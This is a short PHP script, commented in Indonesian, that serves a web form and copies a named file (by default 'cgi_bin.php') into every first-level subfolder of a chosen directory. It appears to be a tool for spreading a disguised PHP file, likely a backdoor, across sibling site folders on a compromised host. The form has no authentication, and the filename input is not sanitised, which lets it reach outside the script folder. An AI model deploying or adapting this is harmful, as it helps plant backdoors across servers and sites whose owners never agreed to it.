<?php
$defaultDir = realpath(__DIR__); // Lokasi asli file copy.php berada
?>

<form method="POST">
    <label><b>Nama file yang akan disalin (file ini harus berada di direktori script):</b></label><br>
    <input type="text" name="filename" value="cgi_bin.php" style="width:350px;"><br><br>

    <label><b>Path direktori target (akan disalin ke semua subfolder 1 level):</b></label><br>
    <input type="text" name="targetdir" value="<?php echo htmlspecialchars($defaultDir); ?>" style="width:350px;"><br><br>

    <button type="submit">Mulai Copy</button>
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = trim($_POST['filename']);
    $targetDir = rtrim(trim($_POST['targetdir']), '/');
    $sourceFile = __DIR__ . '/' . $filename;

    echo "<pre>";
    echo "📂 Direktori script: " . __DIR__ . "\n";
    echo "📄 File yang akan disalin: $sourceFile\n";
    echo "🎯 Target direktori: $targetDir\n\n";

    if (!file_exists($sourceFile)) {
        echo "❌ File tidak ditemukan di lokasi script: $filename\n";
        exit;
    }

    if (!is_dir($targetDir)) {
        echo "❌ Direktori target tidak valid: $targetDir\n";
        exit;
    }

    // Scan direktori target untuk mendapatkan subfolder 1 level saja
    $items = scandir($targetDir);
    
    $success = 0;
    $failed = 0;

    foreach ($items as $item) {
        // Skip current directory (.) and parent directory (..)
        if ($item == '.' || $item == '..') {
            continue;
        }
        
        $subDir = $targetDir . '/' . $item;
        
        // Cek apakah item tersebut adalah direktori
        if (is_dir($subDir)) {
            $dest = $subDir . '/' . basename($filename);
            
            // Cek apakah file sudah ada
            if (file_exists($dest)) {
                echo "⚠️  File already exists in: $subDir (skipped)\n";
                continue;
            }
            
            if (copy($sourceFile, $dest)) {
                echo "✅ Copied to: $dest\n";
                $success++;
            } else {
                echo "❌ Failed to copy to: $dest\n";
                $failed++;
            }
        }
    }

    echo "\n🔚 Done. Total copied: $success | Failed: $failed | Skipped: " . ($failed > 0 ? "0" : "0") . "\n";
    
    if ($success == 0 && $failed == 0) {
        echo "ℹ️  Tidak ada subfolder yang ditemukan di: $targetDir\n";
    }
    echo "</pre>";
}
?>